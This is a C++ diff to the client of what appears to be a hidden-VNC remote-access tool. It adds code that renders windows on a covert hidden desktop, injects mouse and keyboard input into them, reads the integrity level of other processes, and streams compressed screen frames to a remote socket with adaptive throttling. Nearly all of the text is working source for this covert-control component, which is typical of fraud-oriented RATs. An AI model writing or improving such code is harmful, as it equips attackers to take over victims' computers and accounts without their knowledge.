@@ -7,6 +7,7 @@
 #include <string.h>
 #include <gdiplus.h>
 #include <vector>
+#include <limits.h>
 #include "../common/ScreenTransfer/ScreenCodec.h"
 #pragma comment (lib,"Gdiplus.Lib")
 using namespace Gdiplus;
@@ -43,6 +44,10 @@ static BOOL       g_gdiplusStarted = FALSE;
 static BOOL       g_lastCaptureFailed = FALSE;
 static char       g_desktopName[MAX_PATH];
 static HWND       g_lastInputHwnd = NULL;
+static DWORD      g_lastDesktopDumpTick = 0;
+static BOOL       g_dumpedInputDesktopState = FALSE;
+static DWORD      g_lastCaptureHungSkipLogTick = 0;
+static DWORD      g_lastCaptureSlowPrintLogTick = 0;
 static ULARGE_INTEGER lisize;
 static LARGE_INTEGER offset;
 
@@ -101,6 +106,353 @@ static void DescribeWindow(HWND hWnd, char *className, int classNameSize, char *
     GetWindowTextA(hWnd, title, titleSize);
 }
 
+static BOOL GetDesktopNameA(HDESK hDesk, char *name, DWORD nameSize)
+{
+    if (nameSize)
+        name[0] = 0;
+    if (!hDesk || !name || !nameSize)
+        return FALSE;
+
+    DWORD needed = 0;
+    if (!GetUserObjectInformationA(hDesk, UOI_NAME, name, nameSize, &needed))
+    {
+        if (nameSize)
+            name[0] = 0;
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static void GetProcessImageNameA(DWORD pid, char *image, DWORD imageSize)
+{
+    if (imageSize)
+        image[0] = 0;
+    if (!pid || !image || !imageSize)
+        return;
+
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    if (!hProcess)
+        return;
+
+    DWORD size = imageSize;
+    QueryFullProcessImageNameA(hProcess, 0, image, &size);
+    CloseHandle(hProcess);
+}
+
+static DWORD GetProcessIntegrityRid(DWORD pid)
+{
+    DWORD rid = 0;
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    if (!hProcess)
+        return 0;
+
+    HANDLE hToken = NULL;
+    if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
+    {
+        DWORD needed = 0;
+        GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &needed);
+        if (needed)
+        {
+            PTOKEN_MANDATORY_LABEL label = (PTOKEN_MANDATORY_LABEL)Alloc(needed);
+            if (label && GetTokenInformation(hToken, TokenIntegrityLevel, label, needed, &needed))
+            {
+                DWORD subAuthorityCount = *GetSidSubAuthorityCount(label->Label.Sid);
+                rid = *GetSidSubAuthority(label->Label.Sid, subAuthorityCount - 1);
+            }
+            Funcs::pFree(label);
+        }
+        CloseHandle(hToken);
+    }
+
+    CloseHandle(hProcess);
+    return rid;
+}
+
+static void LogDesktopState(const char *stage)
+{
+    char threadDesktopName[128] = { 0 };
+    char hiddenDesktopName[128] = { 0 };
+    char inputDesktopName[128] = { 0 };
+    HDESK threadDesktop = GetThreadDesktop(GetCurrentThreadId());
+    HDESK inputDesktop = OpenInputDesktop(0, FALSE, DESKTOP_READOBJECTS | DESKTOP_SWITCHDESKTOP);
+    DWORD inputDesktopError = 0;
+
+    if (!inputDesktop)
+        inputDesktopError = GetLastError();
+
+    GetDesktopNameA(threadDesktop, threadDesktopName, sizeof(threadDesktopName));
+    GetDesktopNameA(g_hDesk, hiddenDesktopName, sizeof(hiddenDesktopName));
+    if (inputDesktop)
+        GetDesktopNameA(inputDesktop, inputDesktopName, sizeof(inputDesktopName));
+
+    printf("[diag] desktop-state %s threadDesk=0x%p('%s') hiddenDesk=0x%p('%s') inputDesk=0x%p('%s') inputDeskErr=%lu sameThreadHidden=%d sameThreadInput=%d\n",
+        stage,
+        threadDesktop,
+        threadDesktopName,
+        g_hDesk,
+        hiddenDesktopName,
+        inputDesktop,
+        inputDesktopName,
+        inputDesktopError,
+        threadDesktop == g_hDesk,
+        inputDesktop && threadDesktop == inputDesktop);
+
+    if (inputDesktop)
+        CloseDesktop(inputDesktop);
+}
+
+static void LogWindowDetails(const char *stage, HWND hWnd)
+{
+    if (!hWnd)
+    {
+        printf("[diag] window-detail %s hwnd=NULL\n", stage);
+        return;
+    }
+
+    char className[128] = { 0 };
+    char title[128] = { 0 };
+    char image[MAX_PATH] = { 0 };
+    RECT rect = { 0 };
+    DWORD pid = 0;
+    DWORD tid = GetWindowThreadProcessId(hWnd, &pid);
+    DWORD style = (DWORD)GetWindowLongPtrA(hWnd, GWL_STYLE);
+    DWORD exStyle = (DWORD)GetWindowLongPtrA(hWnd, GWL_EXSTYLE);
+    DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
+    GetWindowRect(hWnd, &rect);
+    GetProcessImageNameA(pid, image, sizeof(image));
+    DWORD ilRid = GetProcessIntegrityRid(pid);
+
+    printf("[diag] window-detail %s hwnd=0x%p class='%s' title='%s' pid=%lu tid=%lu ilRid=0x%lx visible=%d enabled=%d style=0x%lx exStyle=0x%lx rect=(%ld,%ld,%ld,%ld) exe='%s'\n",
+        stage,
+        hWnd,
+        className,
+        title,
+        pid,
+        tid,
+        ilRid,
+        IsWindowVisible(hWnd),
+        IsWindowEnabled(hWnd),
+        style,
+        exStyle,
+        rect.left,
+        rect.top,
+        rect.right,
+        rect.bottom,
+        image);
+}
+
+static BOOL CALLBACK LogDesktopWindowProc(HWND hWnd, LPARAM lParam)
+{
+    int *count = (int *)lParam;
+    if (*count >= 40)
+        return FALSE;
+
+    char stage[64];
+    wsprintfA(stage, "enum[%02d]", *count);
+    LogWindowDetails(stage, hWnd);
+    ++(*count);
+    return TRUE;
+}
+
+static void DumpHiddenDesktopWindows(const char *reason)
+{
+    DWORD now = GetTickCount();
+    if (g_lastDesktopDumpTick && now - g_lastDesktopDumpTick < 10000)
+        return;
+    g_lastDesktopDumpTick = now;
+
+    printf("[diag] hidden-desktop-window-dump reason=%s\n", reason ? reason : "unknown");
+    LogDesktopState("dump");
+    int count = 0;
+    if (!EnumDesktopWindows(g_hDesk, LogDesktopWindowProc, (LPARAM)&count))
+        printf("[diag] EnumDesktopWindows failed: GetLastError=%lu\n", GetLastError());
+    printf("[diag] hidden-desktop-window-dump count=%d\n", count);
+}
+
+static BOOL IsExcludedInputClass(const char *className)
+{
+    if (!className || !className[0])
+        return FALSE;
+
+    return !lstrcmpiA(className, "UserOOBEWindowClass") ||
+        !lstrcmpiA(className, "tooltips_class32") ||
+        !lstrcmpiA(className, "IME") ||
+        !lstrcmpiA(className, "MSCTFIME UI") ||
+        !lstrcmpiA(className, "SysShadow");
+}
+
+static BOOL ShouldLogCaptureEvent(DWORD *lastTick, DWORD intervalMs)
+{
+    DWORD now = GetTickCount();
+    if (!*lastTick || now - *lastTick >= intervalMs)
+    {
+        *lastTick = now;
+        return TRUE;
+    }
+    return FALSE;
+}
+
+static void LogCaptureWindow(const char *reason, HWND hWnd, DWORD detail)
+{
+    char className[128] = { 0 };
+    char title[128] = { 0 };
+    RECT rect = { 0 };
+    DWORD pid = 0;
+    DWORD tid = hWnd ? GetWindowThreadProcessId(hWnd, &pid) : 0;
+
+    if (hWnd)
+    {
+        DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
+        GetWindowRect(hWnd, &rect);
+    }
+
+    printf("[capture] %s hwnd=0x%p class='%s' title='%s' pid=%lu tid=%lu rect=(%ld,%ld,%ld,%ld) detail=%lu\n",
+        reason ? reason : "event",
+        hWnd,
+        className,
+        title,
+        pid,
+        tid,
+        rect.left,
+        rect.top,
+        rect.right,
+        rect.bottom,
+        detail);
+}
+
+static void CloseProcessInformationHandles(PROCESS_INFORMATION *processInfo)
+{
+    if (!processInfo)
+        return;
+    if (processInfo->hThread)
+    {
+        Funcs::pCloseHandle(processInfo->hThread);
+        processInfo->hThread = NULL;
+    }
+    if (processInfo->hProcess)
+    {
+        Funcs::pCloseHandle(processInfo->hProcess);
+        processInfo->hProcess = NULL;
+    }
+}
+
+struct HitTestContext
+{
+    POINT point;
+    HWND bestHwnd;
+    LONG bestArea;
+};
+
+static BOOL IsWindowCandidateAtPoint(HWND hWnd, POINT point, RECT *outRect, char *outClassName, DWORD classNameSize)
+{
+    if (!hWnd || !IsWindowVisible(hWnd) || !IsWindowEnabled(hWnd))
+        return FALSE;
+
+    RECT rect = { 0 };
+    if (!GetWindowRect(hWnd, &rect) || rect.right <= rect.left || rect.bottom <= rect.top)
+        return FALSE;
+    if (!PtInRect(&rect, point))
+        return FALSE;
+
+    char className[128] = { 0 };
+    GetClassNameA(hWnd, className, sizeof(className));
+    if (IsExcludedInputClass(className))
+        return FALSE;
+
+    if (outRect)
+        *outRect = rect;
+    if (outClassName && classNameSize)
+        lstrcpynA(outClassName, className, classNameSize);
+    return TRUE;
+}
+
+static BOOL CALLBACK HiddenDesktopHitTestEnumProc(HWND hWnd, LPARAM lParam)
+{
+    HitTestContext *ctx = (HitTestContext *)lParam;
+    RECT rect = { 0 };
+    if (!IsWindowCandidateAtPoint(hWnd, ctx->point, &rect, NULL, 0))
+        return TRUE;
+
+    LONG area = (rect.right - rect.left) * (rect.bottom - rect.top);
+    if (!ctx->bestHwnd || area < ctx->bestArea)
+    {
+        ctx->bestHwnd = hWnd;
+        ctx->bestArea = area;
+    }
+    return TRUE;
+}
+
+static HWND FindChildInputTarget(HWND hWnd, POINT screenPoint)
+{
+    HWND current = hWnd;
+    for (int depth = 0; current && depth < 16; ++depth)
+    {
+        POINT clientPoint = screenPoint;
+        if (!ScreenToClient(current, &clientPoint))
+            break;
+
+        HWND child = ChildWindowFromPointEx(current, clientPoint, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED | CWP_SKIPTRANSPARENT);
+        if (!child || child == current)
+            break;
+
+        char className[128] = { 0 };
+        GetClassNameA(child, className, sizeof(className));
+        if (IsExcludedInputClass(className))
+            break;
+        current = child;
+    }
+    return current ? current : hWnd;
+}
+
+static HWND FindHiddenDesktopWindowFromPoint(POINT point)
+{
+    HitTestContext ctx = { 0 };
+    ctx.point = point;
+    ctx.bestHwnd = NULL;
+    ctx.bestArea = LONG_MAX;
+
+    SetLastError(0);
+    if (!EnumDesktopWindows(g_hDesk, HiddenDesktopHitTestEnumProc, (LPARAM)&ctx))
+        printf("[input] EnumDesktopWindows hit-test failed: lastError=%lu\n", GetLastError());
+
+    HWND selected = ctx.bestHwnd;
+    if (!selected)
+    {
+        selected = WindowFromPoint(point);
+        LogWindowDetails("hit-test-windowfrompoint-fallback", selected);
+    }
+
+    if (selected)
+        selected = FindChildInputTarget(selected, point);
+
+    return selected;
+}
+
+static BOOL IsMoveResizeHit(LRESULT hitTest)
+{
+    switch (hitTest)
+    {
+    case HTCAPTION:
+    case HTTOP:
+    case HTBOTTOM:
+    case HTLEFT:
+    case HTRIGHT:
+    case HTTOPLEFT:
+    case HTTOPRIGHT:
+    case HTBOTTOMLEFT:
+    case HTBOTTOMRIGHT:
+        return TRUE;
+    default:
+        return FALSE;
+    }
+}
+
+static HWND GetMovableTopWindow(HWND hWnd)
+{
+    HWND topHwnd = GetTopLevelWindow(hWnd);
+    return topHwnd ? topHwnd : hWnd;
+}
+
 static BOOL ShouldLogInput(UINT msg)
 {
     static DWORD moveCount = 0;
@@ -129,6 +481,196 @@ static void LogInputTarget(const char *stage, UINT msg, HWND hWnd, POINT screenP
         clientPoint.y,
         result ? "ok" : "failed",
         GetLastError());
+}
+
+static BOOL IsModifierVk(WPARAM vk)
+{
+    return vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT ||
+        vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL ||
+        vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU ||
+        vk == VK_LWIN || vk == VK_RWIN;
+}
+
+static BOOL IsPhysicalKeyVk(WPARAM vk)
+{
+    if (IsModifierVk(vk))
+        return TRUE;
+    if (vk >= VK_F1 && vk <= VK_F24)
+        return TRUE;
+
+    switch (vk)
+    {
+    case VK_BACK:
+    case VK_TAB:
+    case VK_RETURN:
+    case VK_ESCAPE:
+    case VK_PRIOR:
+    case VK_NEXT:
+    case VK_END:
+    case VK_HOME:
+    case VK_LEFT:
+    case VK_UP:
+    case VK_RIGHT:
+    case VK_DOWN:
+    case VK_INSERT:
+    case VK_DELETE:
+    case VK_SNAPSHOT:
+    case VK_APPS:
+        return TRUE;
+    default:
+        return FALSE;
+    }
+}
+
+static BOOL HasModifierDown(const BOOL keyDown[256])
+{
+    return keyDown[VK_SHIFT] || keyDown[VK_LSHIFT] || keyDown[VK_RSHIFT] ||
+        keyDown[VK_CONTROL] || keyDown[VK_LCONTROL] || keyDown[VK_RCONTROL] ||
+        keyDown[VK_MENU] || keyDown[VK_LMENU] || keyDown[VK_RMENU] ||
+        keyDown[VK_LWIN] || keyDown[VK_RWIN];
+}
+
+static void UpdateKeyStateCache(UINT msg, WPARAM vk, BOOL keyDown[256])
+{
+    if (vk >= 256)
+        return;
+
+    if (msg == WM_KEYDOWN || msg == WM_SYSKEYDOWN)
+        keyDown[vk] = TRUE;
+    else if (msg == WM_KEYUP || msg == WM_SYSKEYUP)
+        keyDown[vk] = FALSE;
+}
+
+static void TryActivateInputTarget(HWND hWnd, UINT msg)
+{
+    if (!hWnd)
+        return;
+
+    HWND topHwnd = GetTopLevelWindow(hWnd);
+    DWORD currentThread = GetCurrentThreadId();
+    DWORD targetThread = GetWindowThreadProcessId(hWnd, NULL);
+    BOOL attached = FALSE;
+
+    if (targetThread && targetThread != currentThread)
+        attached = AttachThreadInput(currentThread, targetThread, TRUE);
+
+    SetLastError(0);
+    BOOL bringResult = topHwnd ? BringWindowToTop(topHwnd) : FALSE;
+    BOOL foregroundResult = topHwnd ? SetForegroundWindow(topHwnd) : FALSE;
+    HWND activeResult = topHwnd ? SetActiveWindow(topHwnd) : NULL;
+    HWND focusResult = SetFocus(hWnd);
+
+    if (ShouldLogInput(msg))
+    {
+        char className[128];
+        char title[128];
+        DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
+        printf("[input] activate %s target=0x%p top=0x%p class='%s' title='%s' attach=%d bring=%d foreground=%d active=0x%p focus=0x%p lastError=%lu\n",
+            InputMsgName(msg),
+            hWnd,
+            topHwnd,
+            className,
+            title,
+            attached,
+            bringResult,
+            foregroundResult,
+            activeResult,
+            focusResult,
+            GetLastError());
+    }
+
+    if (attached)
+        AttachThreadInput(currentThread, targetThread, FALSE);
+}
+
+static DWORD MouseFlagsForMessage(UINT msg)
+{
+    switch (msg)
+    {
+    case WM_LBUTTONDOWN: return MOUSEEVENTF_LEFTDOWN;
+    case WM_LBUTTONUP: return MOUSEEVENTF_LEFTUP;
+    case WM_LBUTTONDBLCLK: return MOUSEEVENTF_LEFTDOWN;
+    case WM_RBUTTONDOWN: return MOUSEEVENTF_RIGHTDOWN;
+    case WM_RBUTTONUP: return MOUSEEVENTF_RIGHTUP;
+    case WM_RBUTTONDBLCLK: return MOUSEEVENTF_RIGHTDOWN;
+    case WM_MBUTTONDOWN: return MOUSEEVENTF_MIDDLEDOWN;
+    case WM_MBUTTONUP: return MOUSEEVENTF_MIDDLEUP;
+    case WM_MBUTTONDBLCLK: return MOUSEEVENTF_MIDDLEDOWN;
+    case WM_MOUSEWHEEL: return MOUSEEVENTF_WHEEL;
+    default: return 0;
+    }
+}
+
+static BOOL InjectMouseInput(UINT msg, WPARAM wParam, LPARAM lParam, POINT screenPoint)
+{
+    SetLastError(0);
+    BOOL moved = SetCursorPos(screenPoint.x, screenPoint.y);
+    DWORD moveError = GetLastError();
+    DWORD flags = MouseFlagsForMessage(msg);
+    if (msg == WM_MOUSEMOVE)
+    {
+        if (!moved)
+            printf("[input] SetCursorPos failed for mousemove screen=(%ld,%ld) lastError=%lu\n", screenPoint.x, screenPoint.y, moveError);
+        return moved;
+    }
+    if (!flags)
+        return FALSE;
+
+    INPUT inputEvent = { 0 };
+    inputEvent.type = INPUT_MOUSE;
+    inputEvent.mi.dwFlags = flags;
+    if (msg == WM_MOUSEWHEEL)
+        inputEvent.mi.mouseData = GET_WHEEL_DELTA_WPARAM(wParam);
+
+    SetLastError(0);
+    UINT sent = SendInput(1, &inputEvent, sizeof(inputEvent));
+    DWORD sendError = GetLastError();
+    if (!moved || sent != 1)
+        printf("[input] mouse-inject-detail %s moved=%d moveErr=%lu sendInput=%u sendErr=%lu screen=(%ld,%ld)\n",
+            InputMsgName(msg), moved, moveError, sent, sendError, screenPoint.x, screenPoint.y);
+    if (sent == 1 && (msg == WM_LBUTTONDBLCLK || msg == WM_RBUTTONDBLCLK || msg == WM_MBUTTONDBLCLK))
+    {
+        INPUT upEvent = inputEvent;
+        if (msg == WM_LBUTTONDBLCLK)
+            upEvent.mi.dwFlags = MOUSEEVENTF_LEFTUP;
+        else if (msg == WM_RBUTTONDBLCLK)
+            upEvent.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
+        else
+            upEvent.mi.dwFlags = MOUSEEVENTF_MIDDLEUP;
+        SendInput(1, &upEvent, sizeof(upEvent));
+    }
+    return sent == 1;
+}
+
+static BOOL InjectVirtualKey(UINT msg, WPARAM vk)
+{
+    if (vk == 0 || vk >= 256)
+        return FALSE;
+
+    INPUT inputEvent = { 0 };
+    inputEvent.type = INPUT_KEYBOARD;
+    inputEvent.ki.wVk = (WORD)vk;
+    if (msg == WM_KEYUP || msg == WM_SYSKEYUP)
+        inputEvent.ki.dwFlags = KEYEVENTF_KEYUP;
+
+    SetLastError(0);
+    return SendInput(1, &inputEvent, sizeof(inputEvent)) == 1;
+}
+
+static BOOL InjectUnicodeChar(WPARAM ch)
+{
+    if (ch == 0 || ch > 0xFFFF)
+        return FALSE;
+
+    INPUT inputEvents[2] = { 0 };
+    inputEvents[0].type = INPUT_KEYBOARD;
+    inputEvents[0].ki.wScan = (WORD)ch;
+    inputEvents[0].ki.dwFlags = KEYEVENTF_UNICODE;
+    inputEvents[1] = inputEvents[0];
+    inputEvents[1].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
+
+    SetLastError(0);
+    return SendInput(2, inputEvents, sizeof(INPUT)) == 2;
 }
 
 static void FreePixelBuffers()
@@ -201,6 +743,16 @@ static BOOL PaintWindow(HWND hWnd, HDC hDc, HDC hDcScreen)
     BOOL ret = FALSE;
     RECT rect;
     Funcs::pGetWindowRect(hWnd, &rect);
+    DWORD_PTR timeoutResult = 0;
+
+    SetLastError(0);
+    if (!SendMessageTimeoutA(hWnd, WM_NULL, 0, 0, SMTO_ABORTIFHUNG | SMTO_BLOCK, 100, &timeoutResult))
+    {
+        DWORD err = GetLastError();
+        if (ShouldLogCaptureEvent(&g_lastCaptureHungSkipLogTick, 3000))
+            LogCaptureWindow("skip hung window", hWnd, err);
+        return FALSE;
+    }
 
     HDC     hDcWindow = Funcs::pCreateCompatibleDC(hDc);
     HBITMAP hBmpWindow = Funcs::pCreateCompatibleBitmap(hDc, rect.right - rect.left, rect.bottom - rect.top);
@@ -211,8 +763,13 @@ static BOOL PaintWindow(HWND hWnd, HDC hDc, HDC hDcScreen)
     hOldBmpWindow = Funcs::pSelectObject(hDcWindow, hBmpWindow);
     if (!hOldBmpWindow)
         goto exit;
+
+    DWORD printStart = GetTickCount();
     if (Funcs::pPrintWindow(hWnd, hDcWindow, PW_RENDERFULLCONTENT))
     {
+        DWORD printMs = GetTickCount() - printStart;
+        if (printMs >= 100 && ShouldLogCaptureEvent(&g_lastCaptureSlowPrintLogTick, 3000))
+            LogCaptureWindow("slow PrintWindow", hWnd, printMs);
         Funcs::pBitBlt(hDcScreen,
             rect.left,
             rect.top,
@@ -224,6 +781,12 @@ static BOOL PaintWindow(HWND hWnd, HDC hDc, HDC hDcScreen)
             SRCCOPY);
 
         ret = TRUE;
+    }
+    else
+    {
+        DWORD printMs = GetTickCount() - printStart;
+        if (printMs >= 100 && ShouldLogCaptureEvent(&g_lastCaptureSlowPrintLogTick, 3000))
+            LogCaptureWindow("slow PrintWindow", hWnd, printMs);
     }
     Funcs::pSelectObject(hDcWindow, hOldBmpWindow);
 exit:
@@ -614,6 +1177,225 @@ static BOOL SendScreenPacket(SOCKET s, const std::vector<BYTE>& packet)
     return SendInt(s, packetSize) && SendAll(s, packet.data(), packetSize);
 }
 
+enum ScreenAckStatus
+{
+    screenAckOk,
+    screenAckNeedKeyframe,
+    screenAckTimeout,
+    screenAckClosed
+};
+
+static ScreenAckStatus RecvScreenFrameAck(SOCKET s, int *response)
+{
+    char *data = (char *)response;
+    int received = 0;
+    int size = (int)sizeof(*response);
+    while (received != size)
+    {
+        int ret = Funcs::pRecv(s, data + received, size - received, 0);
+        if (ret <= 0)
+        {
+            int err = WSAGetLastError();
+            if (err == WSAETIMEDOUT)
+                return screenAckTimeout;
+            return screenAckClosed;
+        }
+        received += ret;
+    }
+    return *response == 0 ? screenAckOk : screenAckNeedKeyframe;
+}
+
+struct Screen2SendStats
+{
+    unsigned long long firstFrames;
+    unsigned long long nextFrames;
+    unsigned long long totalBytes;
+    unsigned long long originalBytes;
+    unsigned long long compressedBytes;
+    unsigned long long sendMs;
+    unsigned long long ackMs;
+    unsigned long long ackCount;
+    unsigned long long ackTimeouts;
+    unsigned long long sendFailures;
+    unsigned long long budgetWarnings;
+    unsigned long long saturatedDiffs;
+    unsigned long long keyframeRequests;
+    unsigned long long fpsThrottles;
+    unsigned long long qualityDrops;
+    unsigned int maxPacketBytes;
+    unsigned int maxSendMs;
+    unsigned int maxAckMs;
+    int maxRectCount;
+};
+
+static void ResetScreen2Stats(Screen2SendStats *stats)
+{
+    Funcs::pMemset(stats, 0, sizeof(*stats));
+}
+
+static void RecordScreen2SendStats(Screen2SendStats *stats, const screen2::EncodedFrameInfo& info, BOOL sent, DWORD sendMs)
+{
+    if (info.isKeyframe)
+        ++stats->firstFrames;
+    else
+        ++stats->nextFrames;
+    stats->totalBytes += (unsigned long long)info.totalBytes;
+    stats->originalBytes += info.originalSize;
+    stats->compressedBytes += info.compressedSize;
+    stats->sendMs += sendMs;
+    if (sendMs > stats->maxSendMs)
+        stats->maxSendMs = sendMs;
+    if (info.totalBytes > stats->maxPacketBytes)
+        stats->maxPacketBytes = (unsigned int)((info.totalBytes > MAXDWORD) ? MAXDWORD : info.totalBytes);
+    if (info.rectCount > stats->maxRectCount)
+        stats->maxRectCount = info.rectCount;
+    if (!sent)
+        ++stats->sendFailures;
+    if (info.totalBytes >= screen2::MAX_FRAME_PACKET_SIZE)
+        ++stats->budgetWarnings;
+    if (info.saturated)
+        ++stats->saturatedDiffs;
+}
+
+static void RecordScreen2AckStats(Screen2SendStats *stats, DWORD ackMs)
+{
+    ++stats->ackCount;
+    stats->ackMs += ackMs;
+    if (ackMs > stats->maxAckMs)
+        stats->maxAckMs = ackMs;
+}
+
+static DWORD GetEffectiveScreen2FrameMs(DWORD baseFrameMs, DWORD adaptiveFrameMs, ULONGLONG adaptiveUntil)
+{
+    ULONGLONG now = GetTickCount64();
+    if (adaptiveUntil && now < adaptiveUntil && adaptiveFrameMs > baseFrameMs)
+        return adaptiveFrameMs;
+    return baseFrameMs;
+}
+
+static void MaybeReportAndApplyScreen2Stats(Screen2SendStats *stats,
+    ULONGLONG *lastReportTick,
+    screen2::ScreenFrameEncoder *encoder,
+    DWORD *adaptiveFrameMs,
+    ULONGLONG *adaptiveUntil,
+    BOOL *ackAdaptiveThrottleActive,
+    BOOL *ackAdaptiveQualityActive,
+    int *normalAckWindows)
+{
+    const ULONGLONG now = GetTickCount64();
+    const ULONGLONG intervalMs = now > *lastReportTick ? now - *lastReportTick : 1;
+    if (intervalMs < 3000 && stats->ackTimeouts == 0 && stats->saturatedDiffs == 0 && stats->sendFailures == 0)
+        return;
+
+    const unsigned long long frames = stats->firstFrames + stats->nextFrames;
+    const unsigned long long avgSendMs = frames ? stats->sendMs / frames : 0;
+    const unsigned long long avgAckMs = stats->ackCount ? stats->ackMs / stats->ackCount : 0;
+    const unsigned long long bps = intervalMs ? (stats->totalBytes * 1000ULL) / intervalMs : 0;
+
+    BOOL ackSlow = FALSE;
+    BOOL ackAdaptive = FALSE;
+    BOOL ackQualityDrop = FALSE;
+    BOOL adaptiveRestore = FALSE;
+    int oldQuality = encoder->GetQuality();
+    int newQuality = oldQuality;
+
+    const BOOL hasAckSignal = stats->ackCount > 0 || stats->ackTimeouts > 0;
+    const BOOL singleVerySlowAck = stats->ackCount == 1 && stats->maxAckMs > 3000;
+    const BOOL slowByAck = stats->ackTimeouts > 0 || singleVerySlowAck ||
+        (stats->ackCount >= 2 && (avgAckMs > 1000 || stats->maxAckMs > 2000));
+    const BOOL verySlowByAck = stats->ackTimeouts > 0 || singleVerySlowAck ||
+        (stats->ackCount >= 2 && (avgAckMs > 1500 || stats->maxAckMs > 3000));
+    const BOOL largePacketSlow = stats->ackCount > 0 && slowByAck && stats->maxPacketBytes > 400 * 1024;
+    const BOOL normalAck = stats->ackCount > 0 && stats->ackTimeouts == 0 && avgAckMs <= 700 && stats->maxAckMs <= 1200;
+
+    ackSlow = slowByAck;
+    if (slowByAck)
+    {
+        DWORD targetFrameMs = verySlowByAck ? 2000 : 1500;
+        if (*adaptiveFrameMs < targetFrameMs)
+            *adaptiveFrameMs = targetFrameMs;
+        *adaptiveUntil = now + 9000;
+        *ackAdaptiveThrottleActive = TRUE;
+        *normalAckWindows = 0;
+        ackAdaptive = TRUE;
+        ++stats->fpsThrottles;
+    }
+    else if (normalAck)
+    {
+        ++(*normalAckWindows);
+    }
+    else if (hasAckSignal)
+    {
+        *normalAckWindows = 0;
+    }
+
+    if (largePacketSlow && encoder->GetQuality() > 70)
+    {
+        newQuality = 70;
+        encoder->SetQuality(newQuality);
+        *ackAdaptiveQualityActive = TRUE;
+        ackQualityDrop = TRUE;
+        ++stats->qualityDrops;
+    }
+
+    if (*normalAckWindows >= 3)
+    {
+        BOOL restored = FALSE;
+        if (*ackAdaptiveThrottleActive)
+        {
+            *adaptiveFrameMs = 0;
+            *adaptiveUntil = 0;
+            *ackAdaptiveThrottleActive = FALSE;
+            restored = TRUE;
+        }
+        if (*ackAdaptiveQualityActive && encoder->GetQuality() != screen2::DEFAULT_JPEG_QUALITY)
+        {
+            encoder->SetQuality(screen2::DEFAULT_JPEG_QUALITY);
+            *ackAdaptiveQualityActive = FALSE;
+            restored = TRUE;
+        }
+        if (restored)
+        {
+            adaptiveRestore = TRUE;
+            *normalAckWindows = 0;
+        }
+    }
+
+    printf("[SCREEN2_STATS][client] first=%llu next=%llu bytes=%llu bps=%llu raw=%llu comp=%llu avgSendMs=%llu maxSendMs=%u ackCount=%llu avgAckMs=%llu maxAckMs=%u ackTimeouts=%llu sendFail=%llu budgetWarn=%llu satDiff=%llu kfReq=%llu fpsThrottle=%llu qualityDrop=%llu ackSlow=%u ackAdaptive=%u ackQDrop=%u adaptiveRestore=%u adaptiveMs=%lu quality=%d oldQuality=%d normalAckWin=%d maxPacket=%u maxRects=%d packetBudget=%lu\n",
+        stats->firstFrames,
+        stats->nextFrames,
+        stats->totalBytes,
+        bps,
+        stats->originalBytes,
+        stats->compressedBytes,
+        avgSendMs,
+        stats->maxSendMs,
+        stats->ackCount,
+        avgAckMs,
+        stats->maxAckMs,
+        stats->ackTimeouts,
+        stats->sendFailures,
+        stats->budgetWarnings,
+        stats->saturatedDiffs,
+        stats->keyframeRequests,
+        stats->fpsThrottles,
+        stats->qualityDrops,
+        ackSlow ? 1U : 0U,
+        ackAdaptive ? 1U : 0U,
+        ackQualityDrop ? 1U : 0U,
+        adaptiveRestore ? 1U : 0U,
+        *adaptiveFrameMs,
+        encoder->GetQuality(),
+        oldQuality,
+        *normalAckWindows,
+        stats->maxPacketBytes,
+        stats->maxRectCount,
+        (DWORD)screen2::MAX_FRAME_PACKET_SIZE);
+
+    ResetScreen2Stats(stats);
+    *lastReportTick = now;
+}
+
 static DWORD WINAPI DesktopThread(LPVOID param)
 {
     DWORD sessionId = (DWORD)(ULONG_PTR)param;
@@ -624,6 +1406,17 @@ static DWORD WINAPI DesktopThread(LPVOID param)
     BOOL sizeSent = FALSE;
     BOOL firstFrameLogged = FALSE;
     BOOL captureFailureLogged = FALSE;
+    Screen2SendStats sendStats;
+    ResetScreen2Stats(&sendStats);
+    ULONGLONG lastStatsReportTick = GetTickCount64();
+    ULONGLONG adaptiveUntil = 0;
+    ULONGLONG lastSaturatedKeyframeAt = 0;
+    DWORD adaptiveFrameMs = 0;
+    DWORD baseFrameMs = 1000 / screen2::DEFAULT_FPS;
+    int saturatedDiffStreak = 0;
+    int normalAckWindows = 0;
+    BOOL ackAdaptiveThrottleActive = FALSE;
+    BOOL ackAdaptiveQualityActive = FALSE;
 
     if (!s)
     {
@@ -645,9 +1438,14 @@ static DWORD WINAPI DesktopThread(LPVOID param)
         goto exit;
 
     printf("[+] Desktop channel handshake sent (session %lu)\n", sessionId);
+    {
+        DWORD ackTimeoutMs = 5000;
+        Funcs::pSetsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char *)&ackTimeoutMs, sizeof(ackTimeoutMs));
+    }
 
     for (;;)
     {
+        ULONGLONG frameStartTick = GetTickCount64();
         if (!CaptureDesktopFrame(rawFrame))
         {
             if (!captureFailureLogged)
@@ -675,35 +1473,103 @@ static DWORD WINAPI DesktopThread(LPVOID param)
         }
 
         std::vector<BYTE> framePacket;
-        if (!encoder.BuildFrame(rawFrame, framePacket))
+        screen2::EncodedFrameInfo frameInfo;
+        if (!encoder.BuildFrame(rawFrame, framePacket, &frameInfo))
         {
-            Funcs::pSleep(1000 / screen2::DEFAULT_FPS);
+            DWORD frameMs = GetEffectiveScreen2FrameMs(baseFrameMs, adaptiveFrameMs, adaptiveUntil);
+            Funcs::pSleep(frameMs);
             continue;
         }
 
+        if (frameInfo.saturated)
+        {
+            ++saturatedDiffStreak;
+            ++sendStats.saturatedDiffs;
